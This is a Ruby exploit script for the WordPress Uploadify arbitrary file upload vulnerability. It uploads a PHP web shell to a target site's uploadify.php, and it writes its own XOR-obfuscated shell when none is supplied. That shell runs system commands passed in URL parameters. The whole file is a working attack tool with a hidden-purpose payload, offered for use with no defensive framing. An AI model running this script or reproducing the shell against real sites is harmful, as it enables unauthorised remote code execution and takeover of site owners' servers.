#!/usr/bin/env ruby
#
# WordPress Uploadify - Arbitrary File Upload
# By: Hood3dRob1n
#
# Point it at vuln instance of uploadify.php
# Uploadify eats whatever you throw at it all day long....
# Simple File Upload Vuln as result, nothing special...
# Except it was bundled and included in everything :p
#

require 'rubygems'
require 'curb'

TARGET = ARGV[0]
SHELL = ARGV[1]

if ARGV[0].nil?
  puts "\nMissing Arguments!\n"
  puts "Usage: #{$0} [TARGETUPLOADIFY] [SHELL2UPLOAD]\n\n"
  exit 666;
end

if not SHELL.nil? and File.exists?(SHELL.strip.chomp)
  shell=SHELL.strip.chomp
else
  shell='./detour.php'
  shell_code = "<?
# http://localhost/shell.php?_=shell_exec&__=id
$_=\"{\"; #XOR char
$_=($_^\"<\").($_^\">;\").($_^\"/\"); #XOR = GET
?>
<?=${'_'.$_}[\"_\"](${'_'.$_}[\"__\"]);?>"
  f=File.open(shell, 'w+')
  f.puts shell_code
  f.close
end

# Upload File to Target
c = Curl::Easy.new(TARGET) do |curl|
  curl.ssl_verify_peer = false
  curl.max_redirects = 3
  curl.timeout = 30
  curl.verbose = true
  curl.useragent = 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0'
  curl.multipart_form_post = true
  curl.on_success {|easy| puts "\n\nFile #{shell} has been uploaded!\n\n" }
  begin
    curl.http_post(Curl::PostField.file('Filedata', shell))
  rescue => e
    puts "\n\nEpic Failure Uploading Payload File!\n\t=> #{e}\n\n"
  end
end
File.delete('./detour.php') if File.exists?('./detour.php')
# EOF
